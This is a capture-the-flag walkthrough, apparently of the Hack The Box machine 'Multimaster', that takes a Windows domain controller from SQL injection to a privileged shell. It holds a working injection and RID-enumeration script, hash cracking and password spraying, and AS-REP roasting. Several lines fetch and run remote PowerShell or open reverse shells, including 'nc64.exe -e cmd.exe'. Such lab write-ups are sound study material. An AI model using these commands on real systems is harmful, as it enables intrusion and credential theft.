# Nmap :
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: MegaCorp
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-07 06:49:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  0���HV        Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-07-07T06:51:03+00:00; +7m00s from scanner time.
| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
| Not valid before: 2023-07-06T04:36:04
|_Not valid after:  2024-01-05T04:36:04
| rdp-ntlm-info: 
|   Target_Name: MEGACORP
|   NetBIOS_Domain_Name: MEGACORP
|   NetBIOS_Computer_Name: MULTIMASTER
|   DNS_Domain_Name: MEGACORP.LOCAL
|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
|   DNS_Tree_Name: MEGACORP.LOCAL
|   Product_Version: 10.0.14393
|_  System_Time: 2023-07-07T06:50:23+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49754/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: MULTIMASTER
|   NetBIOS computer name: MULTIMASTER\x00
|   Domain name: MEGACORP.LOCAL
|   Forest name: MEGACORP.LOCAL
|   FQDN: MULTIMASTER.MEGACORP.LOCAL
|_  System time: 2023-07-06T23:50:25-07:00
|_clock-skew: mean: 1h31m00s, deviation: 3h07m50s, median: 6m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2023-07-07T06:50:26
|_  start_date: 2023-07-07T04:36:10

```

# Port 80:

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/3694f0f3-5917-4c8d-b32e-e46aa7c037f6)

# Using this cmd we extracted the users:
```bash
└─$ curl -XPOST -S --data-binary '{"name":""}' http://10.10.10.179/api/getColleagues -H 'Content-Type: application/json' 2>/dev/null | jq '.'[].name | tr -d '"'
Sarina Bauer
Octavia Kent
Christian Kane
Kimberly Page
Shayna Stafford
James Houston
Connor York
Reya Martin
Zac Curtis
Jorden Mclean
Alyx Walters
Ian Lee
Nikola Bourne
Zachery Powers
Alessandro Dominguez
MinatoTW
egre55
```

# Using the cmd we extracted the emails:
```bash
└─$ curl -XPOST -S --data-binary '{"name":""}' http://10.10.10.179/api/getColleagues -H 'Content-Type: application/json' 2>/dev/null | jq '.'[].email | tr -d '"'
sbauer@megacorp.htb
okent@megacorp.htb
ckane@megacorp.htb
kpage@megacorp.htb
shayna@megacorp.htb
james@megacorp.htb
cyork@megacorp.htb
rmartin@megacorp.htb
zac@magacorp.htb
jorden@megacorp.htb
alyx@megacorp.htb
ilee@megacorp.htb
nbourne@megacorp.htb
zpowers@megacorp.htb
aldom@megacorp.htb
minato@megacorp.htb
egre55@megacorp.htb
```

# By adding ' single quote, possibally there is sql injection attack:

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/07625af3-076d-4ae0-ac7a-da26759ed6f4)

# Saved burpsuit file and try with the sqlmap:
```bash
└─# sqlmap -r burp-req --risk 3 --level 5 --tamper=charunicodeescape --delay 5 --random-agent
```
![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/e06fd3fc-b7ba-4635-aaaf-1aa287dac5db)

# Run cmd to dump all data from sql database:
```bash
└─# sqlmap -r burp-req --risk 3 --level 5 --tamper=charunicodeescape --delay 5 --random-agent --batch -dbs --dump-all --exclude-sysdbs

[17 entries]                                               
+------+----------------------+-------------+----------------------+----------------------+
| id   | email                | image       | name                 | position             |
+------+----------------------+-------------+----------------------+----------------------+
| 1    | sbauer@megacorp.htb  | sbauer.jpg  | Sarina Bauer         | Junior Developer     |
| 2    | okent@megacorp.htb   | okent.jpg   | Octavia Kent         | Senior Consultant    |
| 3    | ckane@megacorp.htb   | ckane.jpg   | Christian Kane       | Assistant Manager    |
| 4    | kpage@megacorp.htb   | kpage.jpg   | Kimberly Page        | Financial Analyst    |
| 5    | shayna@megacorp.htb  | shayna.jpg  | Shayna Stafford      | HR Manager           |
| 6    | james@megacorp.htb   | james.jpg   | James Houston        | QA Lead              |
| 7    | cyork@megacorp.htb   | cyork.jpg   | Connor York          | Web Developer        |
| 8    | rmartin@megacorp.htb | rmartin.jpg | Reya Martin          | Tech Support         |
| 9    | zac@magacorp.htb     | zac.jpg     | Zac Curtis           | Junior Analyst       |
| 10   | jorden@megacorp.htb  | jorden.jpg  | Jorden Mclean        | Full-Stack Developer |
| 11   | alyx@megacorp.htb    | alyx.jpg    | Alyx Walters         | Automation Engineer  |
| 12   | ilee@megacorp.htb    | ilee.jpg    | Ian Lee              | Internal Auditor     |
| 13   | nbourne@megacorp.htb | nbourne.jpg | Nikola Bourne        | Head of Accounts     |
| 14   | zpowers@megacorp.htb | zpowers.jpg | Zachery Powers       | Credit Analyst       |
| 15   | aldom@megacorp.htb   | aldom.jpg   | Alessandro Dominguez | Senior Web Developer |
| 16   | minato@megacorp.htb  | minato.jpg  | MinatoTW             | CEO                  |
| 17   | egre55@megacorp.htb  | egre55.jpg  | egre55               | CEO                  |
+------+----------------------+-------------+----------------------+----------------------+

[17 entries]
+------+----------+--------------------------------------------------------------------------------------------------+
| id   | username | password                                                                                         |
+------+----------+--------------------------------------------------------------------------------------------------+
| 1    | sbauer   | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
| 2    | okent    | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |
| 3    | ckane    | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
| 4    | kpage    | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
| 5    | shayna   | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
| 6    | james    | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
| 7    | cyork    | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
| 8    | rmartin  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |
| 9    | zac      | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
| 10   | jorden   | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
| 11   | alyx     | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |
| 12   | ilee     | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
| 13   | nbourne  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |
| 14   | zpowers  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
| 15   | aldom    | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
| 16   | minatotw | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc |
| 17   | egre55   | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc |
+------+----------+--------------------------------------------------------------------------------------------------+
```
# On crcaking the hases got:
```bash
hashcat -a 0 -m 17900 hashes /usr/share/wordlists/rockyou.txt

banking1
finance1
password1
```
# Let's try passsword spray using smbexec:
```bash
└─$ crackmapexec smb 10.10.10.179 -u web-users -p pass --continue-on-success

-----------------failed---------------
```


 # Need to extract the users, in burpsuit type custom queries using escape unicode characeters:
 ```bash
Plain: test' UNION ALL SELECT 58,58,58,DEFAULT_DOMAIN(),58-- gxQm
Converted: \u0074\u0065\u0073\u0074\u0027\u0020\u0055\u004E\u0049\u004F\u004E\u0020\u0041\u004C\u004C\u0020\u0053\u0045\u004C\u0045\u0043\u0054\u0020\u0035\u0038\u002C\u0035\u0038\u002C\u0035\u0038\u002C\u0044\u0045\u0046\u0041\u0055\u004C\u0054\u005F\u0044\u004F\u004D\u0041\u0049\u004E\u0028\u0029\u002C\u0035\u0038\u002D\u002D\u0020\u0067\u0078\u0051\u006D
```
![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/cd0363e5-ef33-4abe-943f-a3fdc76a6032)
```
Plain: test' UNION ALL SELECT 58,58,58,master.dbo.fn_varbintohexstr(SUSER_SID('MEGACORP\Domain Admins')),58-- gxQm
Converted:\u0074\u0065\u0073\u0074\u0027\u0020\u0055\u004E\u0049\u004F\u004E\u0020\u0041\u004C\u004C\u0020\u0053\u0045\u004C\u0045\u0043\u0054\u0020\u0035\u0038\u002C\u0035\u0038\u002C\u0035\u0038\u002C\u006D\u0061\u0073\u0074\u0065\u0072\u002E\u0064\u0062\u006F\u002E\u0066\u006E\u005F\u0076\u0061\u0072\u0062\u0069\u006E\u0074\u006F\u0068\u0065\u0078\u0073\u0074\u0072\u0028\u0053\u0055\u0053\u0045\u0052\u005F\u0053\u0049\u0044\u0028\u0027\u004D\u0045\u0047\u0041\u0043\u004F\u0052\u0050\u005C\u0044\u006F\u006D\u0061\u0069\u006E\u0020\u0041\u0064\u006D\u0069\u006E\u0073\u0027\u0029\u0029\u002C\u0035\u0038\u002D\u002D\u0020\u0067\u0078\u0051\u006D
```
![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/2986e74e-0712-49d0-bfe4-0d7058a7a16c)

Got sid

The RID is 0x0105000000000005150000001c00d1bcd181f1492bdfc23600020000, which makes the domain SID 0x0105000000000005150000001c00d1bcd181f1492bdfc236.

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

the default administrator is RID 500. So I can make this RID by taking 500, converting to hex (0x1f4), padding it to 4 bytes (0x000001f4), and reversing the byte order (0xf4010000). So the administrator RID should be 0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000


# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# By sending this payload we got:
```bash
test' UNION ALL SELECT 58,58,58,SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000),58-- gxQm
```
![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/5ad643a4-2b1f-493f-8349-7d59a33699b4)

# By this script we got the users and accounts:


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/usr/bin/env python3

import binascii
import requests
import struct
import sys
import time


payload_template = """a' UNION ALL SELECT 58,58,58,{},58-- -"""


def unicode_escape(s):
    return "".join([r"\u{:04x}".format(ord(c)) for c in s])


def issue_query(sql):
    while True:
        resp = requests.post(
            "http://10.10.10.179/api/getColleagues",
            data='{"name":"' + unicode_escape(payload_template.format(sql)) + '"}',
            headers={"Content-type": "text/json; charset=utf-8"},
            
        )
        if resp.status_code != 403:
            break
        sys.stdout.write("\r[-] Triggered WAF. Sleeping for 10 seconds")
        time.sleep(10)
    return resp.json()[0]["email"]


print("[*] Finding domain")
domain = issue_query("DEFAULT_DOMAIN()")
print(f"[+] Found domain: {domain}")

print("[*] Finding Domain SID")
sid = issue_query(f"master.dbo.fn_varbintohexstr(SUSER_SID('{domain}\Domain Admins'))")[:-8]
print(f"[+] Found SID for {domain} domain: {sid}")

for i in range(500, 10500):
    sys.stdout.write(f"\r[*] Checking SID {i}" + " " * 50)
    num = binascii.hexlify(struct.pack("<I", i)).decode()
    acct = issue_query(f"SUSER_SNAME({sid}{num})")
    if acct:
        print(f"\r[+] Found account [{i:05d}]  {acct}" + " " * 30)
    time.sleep(1)

print("\r" + " " * 50)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Found users:
```bash
[+] Found SID for MEGACORP domain: 0x0105000000000005150000001c00d1bcd181f1492bdfc236
[+] Found account [00500]  MEGACORP\Administrator                              
[+] Found account [00501]  MEGACORP\Guest                              
[+] Found account [00502]  MEGACORP\krbtgt                              
[+] Found account [00503]  MEGACORP\DefaultAccount                              
[+] Found account [00512]  MEGACORP\Domain Admins                              
[+] Found account [00513]  MEGACORP\Domain Users                              
[+] Found account [00514]  MEGACORP\Domain Guests                              
[+] Found account [00515]  MEGACORP\Domain Computers                              
[+] Found account [00516]  MEGACORP\Domain Controllers                              
[+] Found account [00517]  MEGACORP\Cert Publishers                              
[+] Found account [00518]  MEGACORP\Schema Admins                              
[+] Found account [00519]  MEGACORP\Enterprise Admins                              
[+] Found account [00520]  MEGACORP\Group Policy Creator Owners                              
[+] Found account [00521]  MEGACORP\Read-only Domain Controllers                              
[+] Found account [00522]  MEGACORP\Cloneable Domain Controllers                              
[+] Found account [00525]  MEGACORP\Protected Users                              
[+] Found account [00526]  MEGACORP\Key Admins                              
[+] Found account [00527]  MEGACORP\Enterprise Key Admins                              
[+] Found account [00553]  MEGACORP\RAS and IAS Servers                              
[+] Found account [00571]  MEGACORP\Allowed RODC Password Replication Group                              
[+] Found account [00572]  MEGACORP\Denied RODC Password Replication Group                              
[+] Found account [01000]  MEGACORP\MULTIMASTER$                              
[+] Found account [01101]  MEGACORP\DnsAdmins                              
[+] Found account [01102]  MEGACORP\DnsUpdateProxy                              
[+] Found account [01103]  MEGACORP\svc-nas                              
[+] Found account [01105]  MEGACORP\Privileged IT Accounts                              
[+] Found account [01110]  MEGACORP\tushikikatomo                              
[+] Found account [01111]  MEGACORP\andrew                              
[+] Found account [01112]  MEGACORP\lana                               
[+] Found account [01601]  MEGACORP\alice                              
[+] Found account [01602]  MEGACORP\test                               
[+] Found account [02101]  MEGACORP\dai                                
[+] Found account [02102]  MEGACORP\svc-sql                              
[+] Found account [03101]  MEGACORP\SQLServer2005SQLBrowserUser$MULTIMASTER                              
[+] Found account [03102]  MEGACORP\sbauer                              
[+] Found account [03103]  MEGACORP\okent                              
[+] Found account [03104]  MEGACORP\ckane                              
[+] Found account [03105]  MEGACORP\kpage                              
[+] Found account [03106]  MEGACORP\james                              
[+] Found account [03107]  MEGACORP\cyork                              
[+] Found account [03108]  MEGACORP\rmartin                              
[+] Found account [03109]  MEGACORP\zac                                
[+] Found account [03110]  MEGACORP\jorden                 
```
# After running the crcakmapexec with the passwords found earlier:
```bash
└─$ crackmapexec smb 10.10.10.179 -u users -p pass --continue-on-success

SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\tushikikatomo:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP\tushikikatomo:finance1 

# Login to EvilWin:
root@kali# evil-winrm -u "MEGACORP\tushikikatomo" -p finance1 -i 10.10.10.179
PS C:\inetpub> whoami
megacorp\tushikikatomo
```

# Upload and run privcheck.ps1:
```bash
PS C:\users\alcibiades\desktop> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.4/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended

+------+------------------------------------------------+------+
| TEST | APPS > Non-default Apps                        | INFO |
+------+------------------------------------------------+------+
| DESC | Enumerate non-default and third-party applications by |
|      | parsing the registry.                                 |
+------+-------------------------------------------------------+
[*] Found 8 result(s).

Name                         FullName
----                         --------
Microsoft SQL Server         C:\Program Files (x86)\Microsoft SQL Server
Microsoft Visual Studio 10.0 C:\Program Files (x86)\Microsoft Visual Studio 10.0
Microsoft                    C:\Program Files\Microsoft
Microsoft SQL Server         C:\Program Files\Microsoft SQL Server
Microsoft Visual Studio 10.0 C:\Program Files\Microsoft Visual Studio 10.0
Microsoft VS Code            C:\Program Files\Microsoft VS Code
VMware                       C:\Program Files\VMware
VMware Tools                 C:\Program Files\VMware\VMware Tools
```

# Found exploit: Reference
```bash
upload cefdebug.exe

PS C:\programdata> ./cefdebug.exe
cefdebug.exe : [2023/07/09 17:03:00:8276] U: There are 5 tcp sockets in state listen.
    + CategoryInfo          : NotSpecified: ([2023/07/09 17:...n state listen.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[2023/07/09 17:03:20:8767] U: There were 3 servers that appear to be CEF debuggers.
[2023/07/09 17:03:20:8767] U: ws://127.0.0.1:44630/31a8f9e9-8221-455c-bc26-246e8c562285
[2023/07/09 17:03:20:8767] U: ws://127.0.0.1:64892/45daa8cd-4253-4089-aa3a-a5aea37a96f5
[2023/07/09 17:03:20:8767] U: ws://127.0.0.1:51132/9522a477-6bdd-4065-b378-a1aa82f68d1f

```
# Start netcat and upload powershell-rev-shell:
```bash
PS C:\programdata> .\cefdebug.exe --url ws://127.0.0.1:44630/31a8f9e9-8221-455c-bc26-246e8c562285 --code "process.mainModule.require('child_process').exec('powershell IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.14.4/ps_rev_shell.ps1\')')"
```

# Got shell:
```bash
└─$ rlwrap nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.179] 61526
PSReverseShell# whoami
megacorp\cyork

C:\inetpub\wwwroot\bin


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------                 
-a----        7/24/2012  11:18 PM          45416 Microsoft.Web.Infrastructure.dll                                      
-a----         1/9/2020   4:13 AM          13824 MultimasterAPI.dll                                                    
-a----         1/9/2020   4:13 AM          28160 MultimasterAPI.pdb                 

# Get the file using smbserver.py and cat the file got:
server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!

# Do password spray:
└─$ crackmapexec winrm 10.10.10.179 -u users -p 'D3veL0pM3nT!' --continue-on-success

WINRM       10.10.10.179    5985   MULTIMASTER      [+] MEGACORP\sbauer:D3veL0pM3nT! (Pwn3d!)
```

# Evil-Winrm to sbauer:
```bash
└─$ evil-winrm -i 10.10.10.179 -u sbauer -p D3veL0pM3nT!       
```
# Bloodhound data:
`
Generic Write permissions
`
![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/c979a1af-db5a-4ef8-80c6-18f2e94f210a)

# Upload PowerView.ps1:
```bash
PS C:\Users\sbauer\Documents> copy //10.10.14.4/s/PowerView.ps1 .

> Got blocked run the cmd in evil-winrm:
> menu
> Bypass-4MSI
```
# Run PowerView.ps1 with the cmd for GenericWrite: 
```bash
PS C:\Users\sbauer\Documents> Import-Module ./PowerView.ps1
PS C:\Users\sbauer\Documents> Get-ADUser jorden | Set-ADAccountControl -doesnotrequirepreauth $true
```
# Run GetNPUsers.py to get tgt:
```bash
└─$ GetNPUsers.py -no-pass -dc-ip 10.10.10.179 megacorp/jorden 
[*] Getting TGT for jorden
$krb5asrep$23$jorden@MEGACORP:3d63cce6c396461d59e8b8fca1b68c46$7af1dfaee2dd39c80f1366b76585ce234985e98e605d91b54763a8b12aadc90e0f63c024048331b46168024b53e04c5588207d8e02f499df114431729e31a59ce1fe8c1e91c6e3ba0814f385b80cb55b1989a441c701bbb6477119602fa07f0a1642a64e9924b77888881aed6ce8df0ea5cd63edf4ed3851b65e931b819d45465dcd00f7c0744531b104c6da6ee35e2e2da539a68176b707a1637cb5864bd69ac7a57bd163ec3f30497c587fe5d91cb344634419c9afb5ffe114718b9225c23b91394c923dd112c527496556df6600ec979bfcf460eae17b140092bbcb9ca5fabc0d95446df58d28a85a
```

# Crack Hash:
```bash
└─$ hashcat hash-jorden /usr/share/wordlists/rockyou.txt
6df58d28a85a:rainforest786
```

# Login using the credentials:
```bash
└─$ evil-winrm -i 10.10.10.179 -u jorden -p rainforest786          
```       

# AFter running winpeas
```bash
[+] Looking if you can modify any service registry()
   [?] Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions
    HKLM\system\currentcontrolset\services\.NET CLR Data (Server Operators [WriteData/CreateFiles GenericWrite])     
    HKLM\system\currentcontrolset\services\.NET CLR Networking (Server Operators [WriteData/CreateFiles GenericWrite])                                                   
    HKLM\system\currentcontrolset\services\.NET CLR Networking 4.0.0.0 (Server Operators [WriteData/CreateFiles GenericWrite])
    HKLM\system\currentcontrolset\services\.NET Data Provider for Oracle (Server Operators [WriteData/CreateFiles GenericWrite])
    HKLM\system\currentcontrolset\services\.NET Data Provider for SqlServer (Server Operators [WriteData/CreateFiles GenericWrite])
    HKLM\system\currentcontrolset\services\.NET Memory Cache 4.0 (Server Operators [WriteData/CreateFiles GenericWrite])                                                
    HKLM\system\currentcontrolset\services\.NETFramework (Server Operators [WriteData/CreateFiles GenericWrite])     
    HKLM\system\currentcontrolset\services\1394ohci (Server Operators [WriteData/CreateFiles GenericWrite])
    HKLM\system\currentcontrolset\services\3ware (Server Operators [WriteData/CreateFiles GenericWrite])
    HKLM\system\currentcontrolset\services\ACPI (Server Operators [WriteData/CreateFiles GenericWrite])
    HKLM\system\currentcontrolset\services\AcpiDev (Server Operators [WriteData/CreateFiles GenericWrite])
    HKLM\system\currentcontrolset\services\acpiex (Server Operators [WriteData/CreateFiles GenericWrite])
    HKLM\system\currentcontrolset\services\acpipagr (Server Operators [WriteData/CreateFiles GenericWrite])
    HKLM\system\currentcontrolset\services\AcpiPmi (Server Operators [WriteData/CreateFiles GenericWrite])
    HKLM\system\currentcontrolset\services\acpitime (Server Operators [WriteData/CreateFiles GenericWrite]) 
```
# Run cmd:
```bash
PS C:\programdata> sc.exe config browser binPath= "C:\programdata\nc64.exe -e cmd.exe 10.10.14.4 9001"
[SC] ChangeServiceConfig SUCCESS

PS C:\programdata> sc.exe stop browser

PS C:\programdata> sc.exe start browser

w00t got shell.
```

OR
```bash
# Using sc bacup privilege we can copy data from administartor to our location:
 PS C:\programdata> robocopy /b C:\users\administrator\desktop C:\programdata\temp
```


